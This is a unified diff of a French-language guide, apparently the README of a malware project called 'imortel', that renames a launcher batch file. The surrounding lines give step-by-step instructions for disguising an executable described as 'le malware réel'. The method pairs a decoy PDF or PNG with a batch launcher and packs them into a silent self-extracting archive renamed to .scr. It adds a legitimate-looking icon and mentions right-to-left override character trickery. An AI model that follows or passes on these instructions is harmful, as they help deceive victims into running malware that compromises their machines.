@@ -106,7 +106,7 @@ Le programme injecte et exécute du code machine directement en mémoire, ce qui
 ⚠️**TECHNIQUE D'OBFUSCATION, D'EMBALLAGE ET DE STÉGANOGRAPHIE AVEC LE CARACTÈRE RLO**⚠️
 
 **Étape 1** : Vous devez d'abord créer un fichier batch qui servira à exécuter les composants malveillants.
-Créez un fichier texte nommé **lance.bat** (clic droit -> Nouveau -> Document texte, puis renommez-le) 
+Créez un fichier texte nommé **imortel.bat** (clic droit -> Nouveau -> Document texte, puis renommez-le) 
 Dans ce fichier, insérez exactement ces deux lignes :
 ```bash
 start "" "imortel.pdf" ou "imortel.png"
@@ -121,7 +121,7 @@ Lancer silencieusement l'exécutable malveillant en arrière-plan ou premier pla
 Sélectionnez les trois fichiers nécessaires :
 - **imortel.pdf** ou **imortel.png** (leurre stéganographique)
 - **imortel.exe** (le malware réel)
-- **lance.bat** (le script de lancement)
+- **imortel.bat** (le script de lancement)
 Faites un clic droit -> "Ajouter à l'archive..."
 
 Configurez l'archive comme suit :
@@ -129,7 +129,7 @@ Configurez l'archive comme suit :
 Nom de l'archive : **Imortel.scr** (l'extension .scr est cruciale car elle s'exécute comme un .exe mais moins suspecte)
 Cocher : "Créer une archive SFX" (auto-extractible)
 Dans l'onglet "Avancé", cliquez sur "Options SFX..." et configurez ceci :
-- **Champ "Exécuter après extraction"** : tapez lance.bat
+- **Champ "Exécuter après extraction"** : tapez imortel.bat
 - **Onglet "Modes"** : choisissez "Masquer tout" (Silent mode) pour exécuter sans interface visible
 - **Onglet "Mise à jour"** : choisissez "Écraser tous les fichiers" pour éviter les conflits
 - **Onglet "Texte et icône"** : parcourez et sélectionnez l'icône imortel.ico ou autre pour donner une apparence légitime
